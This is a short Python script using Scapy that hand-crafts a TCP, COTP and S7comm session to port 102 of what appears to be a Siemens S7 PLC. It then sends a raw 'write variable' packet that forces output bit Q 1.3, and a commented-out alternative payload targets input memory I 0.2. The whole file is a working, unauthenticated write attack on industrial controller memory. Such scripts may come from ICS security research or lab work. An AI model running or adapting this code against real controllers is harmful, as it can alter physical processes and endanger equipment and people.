#!/usr/local/bin/python
#WRITING THE DIGITAL INPUT/OUTPUT MEMORY OF THE PLC
import sys
from scapy.all import *
from binascii import unhexlify
sport= random.randint(1024,2000)
#SYN
ip=IP(src='192.168.0.2',dst='192.168.0.1',proto=6,flags=2)
SYN=TCP(sport=sport,dport=102,flags='S')
SYNACK=sr1(ip/SYN)
#ACK
ACK=TCP(sport=sport,dport=102,flags='A',seq=1,ack=SYNACK.seq+1)
send(ip/ACK)
#CONNECTION REQUEST
header_1= TCP(sport=sport, dport=102, flags='PA', seq=1, ack=SYNACK.seq+1)
protocol="\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc0\x01\x0a\xc1\x02\x01\x00\xc2\x02\x01\x01"
rsp_1 = sr1(ip/header_1/protocol)
#SETUP COMMUNICATION
header_2 = TCP(sport=sport, dport=102, flags='PA', seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40)
proto_2="\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00\xf0\x00\x00\x01\x00\x01\x01\xe0"
rsp_1 = sr1(ip/header_2/proto_2)
#SENDING ACK
s71PA=TCP(sport=sport,dport=102,flags='A',seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40)

#\x03\x00\x00\x24\x02\xf0\x80\x32\x01\x00\x00\x02\x00\x00\x0e\x00\x05\
#x05 WRITE VARIABLE
#\x01\x12\x0a\x10\x02\
#x00\x01 LENGTH
#\x00\x00
#\x82 OUTPUT MEMORY, CHANGE TO \x81 FOR INPUT MEMORY. FOR INSTANCE THE VARIABLE CALLED sensor_input SHOWS A PAYLOAD FOR THE INPUT MEMORY.
#\x00\x00\x08\x00
#\x04 TRANSPORT SIZE
#\x00\x08 LENGTH
#\x08 VALUE

header=TCP(sport=sport, dport=102, flags='PA', seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40) 
#------------------------------PAYLOAD FOR SPACE OF MEMORY Q 1.3-----------------------------------
sensor = "\x03\x00\x00\x24\x02\xf0\x80\x32\x01\x00\x00\x02\x00\x00\x0e\x00\x05\x05\x01\x12\x0a\x10\x02\x00\x01\x00\x00\x82\x00\x00\x08\x00\x04\x00\x08\x08"
#------------------------------PAYLOAD FOR SPACE OF MEMORY I 0.2-----------------------------------
#sensor_input = "\x03\x00\x00\x24\x02\xf0\x80\x32\x01\x00\x00 \x02\x00\x00\x0e\x00\x05\x05\x01\x12\x0a\x10\x02\x00\x01\x00\x00\x81\x00\x00\x08\x00\x04\x00\x08\x2b"

rsp_1 = sr1(ip/header/sensor)

s71PA=TCP(sport=sport,dport=102,flags='A',seq=rsp_1.ack, ack=rsp_1.len+rsp_1.seq-40)
send(ip/s71PA)



